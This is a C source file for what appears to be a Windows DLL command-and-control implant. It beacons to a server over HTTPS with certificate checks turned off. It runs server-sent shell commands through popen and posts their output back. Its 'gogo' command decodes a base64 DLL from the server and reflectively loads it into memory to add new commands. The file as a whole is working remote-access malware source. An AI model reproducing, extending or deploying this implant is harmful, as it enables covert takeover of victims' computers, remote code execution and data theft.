// cl.exe /LD /MD main.c gadget_loader.c /Fo.\obj\ /O2 /Ot /GL

#include "main.h"

CommandStruct clientinfo;

char* HEADER_KEY_COMMAND  = "command: ";
char* HEADER_KEY_COMMANDS = "Commands: ";
char* HEADER_KEY_CLIENTID = "clientid: ";

// Built-in Commands
char* CMD_exec(char* args)
{
    char* tmp = execute_command(args);
    debugf("Command: %s\nResult: %s\n", args, tmp);
    return tmp;
}

char* CMD_shell(char* args)
{
    MessageBox(NULL, "Received shell command", "Shell Command", MB_OK);
    return NULL;
}

char* CMD_gogo(char* args)
{
    debugf("Received gogo command with arguments: %s\n", args);
    size_t gadget_len = 0;
    LPVOID lpBuffer = NULL;
    HANDLE hModule  = NULL;
    unsigned char* gadget = base64_decode(args, strlen(args), &gadget_len);

    if (gadget == NULL)
    {
        return NULL;
    }
    
    debugf("gadget: %p gadget length: %zu", gadget, gadget_len);
    CommandNodePointer func;
    hModule = (HANDLE)ReflectiveLoader(gadget, &func);
    if(!hModule)
    {
        debugf("Failed to inject the DLL");
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
        return NULL;
    }
    
    CommandNode* tester = func();
    debugf("Tester: %s\n", tester->command);

    insertCommandNode(clientinfo.commandList, createCommandNode(tester->command, tester->function));
    SAFE_FREE(clientinfo.data_commands);
    clientinfo.data_commands = getCommands(clientinfo.commandList, NULL);
    update_curl_headers();

    debugf("Inserted command!\n");

    return NULL;
}

char* CMD_quit(char* args)
{
    exit(0);
}

char* CMD_install(char* args)
{
    FILE *fp = fopen("installed.txt", "w");
    if (fp != NULL)
    {
        fprintf(fp, "Installed\n");
        fclose(fp);
    }
    return NULL;
}

// Callback function to handle incoming data
void check_response(char* data)
{   
    // Find the first space character to separate command and arguments
    char *space_pos = strchr(data, ' ');

    // Replace space with null byte to separate command and arguments
    if (space_pos != NULL)
    {
        *space_pos = '\0';
    }
    // Calculate pointers for command and arguments
    char *command = data;
    char *arguments = space_pos + 1;

    CommandNode* commandnode = findCommandNode(clientinfo.commandList, command);

    if (commandnode != NULL)
    {
        // If it's an `exec` command, the arguments (ie "ls -al") are the actual command
        if (!strcmp(commandnode->command, "exec"))
        {
            clientinfo.data_command = strdup(arguments);
        }
        else
        {
            clientinfo.data_command = strdup(commandnode->command);
        }
        clientinfo.data_response = commandnode->function(arguments);
    }
}

int main(void)
{
    debugf("main.\n");
    // Initialize the CommandStruct
    clientinfo.commandList     = create_list();
    clientinfo.header_command  = HEADER_KEY_COMMAND;
    clientinfo.header_commands = HEADER_KEY_COMMANDS;
    clientinfo.header_clientid = HEADER_KEY_CLIENTID;
    clientinfo.data_command   = NULL;
    clientinfo.data_commands   = NULL;
    clientinfo.data_clientid   = "10"; // TODO: Not static
    clientinfo.data_response   = NULL;
    clientinfo.client_headers  = NULL;

    // Initialize curl
    curl_global_init(CURL_GLOBAL_DEFAULT);

    // Initialize built-in commands
    insertCommandNode(clientinfo.commandList, createCommandNode("exec", CMD_exec));
    insertCommandNode(clientinfo.commandList, createCommandNode("shell", CMD_shell));
    insertCommandNode(clientinfo.commandList, createCommandNode("gogo", CMD_gogo));
    insertCommandNode(clientinfo.commandList, createCommandNode("quit", CMD_quit));
    insertCommandNode(clientinfo.commandList, createCommandNode("install", CMD_install));

    // Initialize available commands that the server returns; updated in `gogo` command
    debugf("Getting commands\n");
    clientinfo.data_commands = getCommands(clientinfo.commandList, NULL);
    update_curl_headers();

    // Start C2
    debugf("Starting C2\n");

    jitter_connect();

    // End
    curl_global_cleanup();
}

void jitter_connect()
{
    // TODO: Make this jitter instead of a constant time.
    // Seperate initial connect from interactive connection?
    // Initial connect will probably be handled by a wrapper program, in case of crashes in this one
    while (1)
    {
        command_loop();
        Sleep(5 * 1000);  
    }
}

// Callback function to write received data to a dynamically growing buffer
size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userdata;
    
    // Reallocate memory to fit the new data
    char *ptr_realloc = realloc(mem->memory, mem->size + realsize + 1);
    if (ptr_realloc == NULL)
    {
        debugf("Memory allocation failed\n");
        return 0;
    }
    
    mem->memory = ptr_realloc;
    memcpy(&(mem->memory[mem->size]), ptr, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = '\0';
    
    return realsize;
}

void update_curl_headers(void)
{
    // Dump exising headers
    if (clientinfo.client_headers)
    {
        curl_slist_free_all(clientinfo.client_headers);
    }

    // Create a new header list
    char* clientid = make_header(clientinfo.header_clientid, clientinfo.data_clientid);
    char* commands = make_header(clientinfo.header_commands, clientinfo.data_commands);
    debugf("commands: %s\n", commands);
    clientinfo.client_headers = curl_slist_append(NULL, clientid);
    curl_slist_append(clientinfo.client_headers, commands);

    debugf("Added first two headers.\n");
    // curl append `strdup`s the data, so free our buffers
    SAFE_FREE(clientid);
    SAFE_FREE(commands);

    // Add command header (executed command)
    if (clientinfo.data_command)
    {
        char* command = make_header(clientinfo.header_command, clientinfo.data_command);
        curl_slist_append(clientinfo.client_headers, command);
        SAFE_FREE(command);
    }
    debugf("End of update headers.\n");
}

char* make_header(const char* header, const char* data)
{
    size_t buffer_len = strlen(header) + strlen(data) + 2;
    char* buffer = calloc(buffer_len, sizeof(char));
    if (!buffer)
    {
        return NULL;
    }
    if (snprintf(buffer, buffer_len, "%s%s", header, data) < 0)
    {
        return NULL;
    }
    debugf("Make header, buffer: %s\n", buffer);
    return buffer;
}

void command_loop(void)
{
    struct MemoryStruct chunk;

    // Stuff that will need to be free'd
    CURL *curl = NULL;
    chunk.memory = calloc(1,1);

    // Initialize the "chunk" used to receive data
    if (chunk.memory == NULL)
    {
        debugf("Memory allocation failed\n");
        return;
    }
    chunk.size = 0;  // No data yet
    
    curl = curl_easy_init();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, "https://127.0.0.1/");      // TODO: Round-robin servers

        // For errors
        char errbuf[CURL_ERROR_SIZE];
        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);
        errbuf[0] = 0;

        // If clientinfo.data_response is not NULL, we have data to send to the server
        if (clientinfo.data_response != NULL)
        {
            debugf("sending response: %s\n", clientinfo.data_response);
            // Does not create a copy of data, so mark that it needs to be free'd
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, clientinfo.data_response);
            // Update headers with current command
            update_curl_headers();
        }
        else
        {
            // No data to send to server, so perform a GET request
            // curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "none");
        }

        // Set headers
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, clientinfo.client_headers);

        // Disable SSL certificate verification
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        // Specify the callback function to handle the response data
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

        // Perform the request
        CURLcode res = curl_easy_perform(curl);

        // If sent a response, free the response and remove the command header
        // This happens here before we check the `current` response from server
        if (clientinfo.data_response)
        {
            SAFE_FREE(clientinfo.data_response);
            SAFE_FREE(clientinfo.data_command);
            update_curl_headers();
        }

        if (res != CURLE_OK)
        {
            size_t len = strlen(errbuf);
            debugf("\nlibcurl: (%d) ", res);
            if(len)
            {
                debugf("IF:%s\n", errbuf);
            }
            else
            {
                long response_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                debugf("ELSE:%s\n", curl_easy_strerror(res));
                debugf("Response code: %ld\n", response_code);
            }
        }
        else
        {
            // Don't assume empty memory was assigned to chunk.memory, so check chunk.size
            if (chunk.size)
            {
                check_response(chunk.memory);
            }
        }

        // Cleanup
        debugf("performing curl cleanup.\n");
        curl_easy_cleanup(curl);
    }
    debugf("Freeing stuff.\n");
    SAFE_FREE(chunk.memory);
    debugf("Done with loop\n");
}

// Execute a command and capture its output. Cross-compilable for both Unix and Windows
char *execute_command(const char *cmd)
{
    #ifdef _WIN32
    #define popen _popen
    #define pclose _pclose
    #endif
    FILE *fp;
    char *result = NULL;
    char *tmp = NULL;
    char line[1024];
    size_t len = 0;
    size_t total_size = 0;

    // Open the command for reading
    fp = popen(cmd, "r");
    if (fp == NULL)
    {
        debugf("Failed to run command\n");
        return NULL;
    }

    // Read output line by line and dynamically allocate memory
    while (fgets(line, sizeof(line), fp) != NULL)
    {
        size_t line_length = strlen(line);
        tmp = realloc(result, total_size + line_length + 1);
        if (tmp == NULL)
        {
            debugf("Memory allocation failed\n");
            pclose(fp);
            return result;
        }
        result = tmp;
        strcpy(result + total_size, line);
        total_size += line_length;
    }

    // Clean up
    pclose(fp);
    return result;
}

__declspec(dllexport) void MainExport(void)
{
    main();
}
